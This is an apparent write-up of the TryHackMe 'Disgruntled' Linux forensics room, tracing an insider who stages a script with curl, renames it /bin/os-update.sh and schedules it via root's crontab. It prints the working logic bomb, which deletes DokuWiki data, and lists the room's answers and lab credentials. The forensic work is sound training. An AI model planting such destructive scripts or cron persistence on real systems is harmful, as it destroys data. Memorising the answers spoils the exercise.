---
title: Disgruntled
summary: TryHackMe Linux forensics room investigating a disgruntled IT user's privileged commands, account creation, script staging, cron persistence, and logic bomb.
date: 2026-07-01
tags: [TryHackMe, Linux Forensics, Incident Response, Logs, Cron, Sudo, Logic Bomb]
difficulty: easy
os: Linux
url: https://tryhackme.com/room/disgruntled
---

# CTF Room: Disgruntled
- [Link to room](https://tryhackme.com/room/disgruntled)
- **Difficulty:** Easy
- **Category:** Linux Forensics, Incident Response, Log Analysis
- **OS:** Linux

## 1. Brief
Disgruntled is a TryHackMe Linux forensics room. The scenario asks us to investigate whether an arrested IT employee made malicious changes to a client's Linux machine.

The investigation focused on privileged command history, user creation, sudoers changes, file staging, and scheduled execution.

## 2. Lab Access
The room could be accessed over SSH with the provided root credentials.

### SSH
```bash
ssh root@10.129.134.0
```

### Credentials
```text
Username: root
Password: ||password||
```

## 3. Task 1 - Introduction

#### Grab a cup of coffee.
No answer was required for this task.

## 4. Task 2 - Linux Forensics Review

#### Take a sip of coffee.
No answer was required for this task.

## 5. Task 3 - Nothing Suspicious... So Far

#### The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?
The room hint pointed toward privileged commands. In the `cybert` user's `.bash_history`, I found that `dokuwiki` had been installed with elevated privileges.

### Evidence
```bash
sudo apt install dokuwiki
```

The log format expected the resolved command path.

### Answer
```text
/usr/bin/apt install dokuwiki
```

#### What was the present working directory (PWD) when the previous command was run?
The command was run from the `cybert` user's home directory.

### Answer
```text
/home/cybert
```

## 6. Task 4 - Let's See If You Did Anything Bad

#### Which user was created after the package from the previous task was installed?
After the package installation, a new user account was created.

### Answer
```text
it-admin
```

#### A user was then later given sudo privileges. When was the sudoers file updated?
The sudoers update occurred shortly after the new account was created.

### Answer
```text
Dec 28 06:27:34
```

#### A script file was opened using the `vi` text editor. What is the name of this file?
The `it-admin` shell history showed the suspicious script being opened in `vi`.

### Answer
```text
bomb.sh
```

## 7. Task 5 - Bomb Has Been Planted

#### What is the command used that created the file `bomb.sh`?
The command history showed the user downloading a prepared script from an internal host and saving it as `bomb.sh`.

### Answer
```bash
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
```

#### The file was renamed and moved to a different directory. What is the full path of this file now?
The file no longer existed as `bomb.sh`. Checking Vim history and filesystem metadata showed it had been moved into `/bin`.

### Answer
```text
/bin/os-update.sh
```

#### When was the file from the previous question last modified?
I checked the moved file with `stat`.

### Command
```bash
stat /bin/os-update.sh
```

### Relevant Output
```text
Modify: 2022-12-28 06:29:43.998004273 +0000
```

### Answer
```text
Dec 28 06:29
```

#### What is the name of the file that will get created when the file from the first question executes?
Reading the moved script showed the logic bomb behavior.

### Command
```bash
cat /bin/os-update.sh
```

### Script
```bash
# 2022-06-05 - Initial version
# 2022-10-11 - Fixed bug
# 2022-10-15 - Changed from 30 days to 90 days
OUTPUT=`last -n 1 it-admin -s "-90days" | head -n 1`
if [ -z "$OUTPUT" ]; then
        rm -r /var/lib/dokuwiki
        echo -e "I TOLD YOU YOU'LL REGRET THIS!!! GOOD RIDDANCE!!! HAHAHAHA\n-mistermeist3r" > /goodbye.txt
fi
```

If `it-admin` had not logged in during the checked window, the script would remove DokuWiki data and create `/goodbye.txt`.

### Answer
```text
goodbye.txt
```

## 8. Task 6 - Following The Fuse

#### At what time will the malicious file trigger?
The script was scheduled in the system-wide crontab.

### Command
```bash
cat /etc/crontab
```

### Relevant Output
```text
# m h dom mon dow user    command
0 8 * * * root    /bin/os-update.sh
```

The cron expression `0 8 * * *` runs every day at 08:00.

### Answer
```text
08:00 AM
```

## 9. Task 7 - Conclusion

#### I'm kidding, of course! But you did good, kid.
No answer was required for this task.

## 10. Summary
The investigation showed that the disgruntled IT user installed DokuWiki, created the `it-admin` account, granted sudo access, downloaded a suspicious script as `bomb.sh`, moved it to `/bin/os-update.sh`, and scheduled it through `/etc/crontab`.

The final script was a logic bomb designed to remove `/var/lib/dokuwiki` and write `/goodbye.txt` if the account activity condition was met.
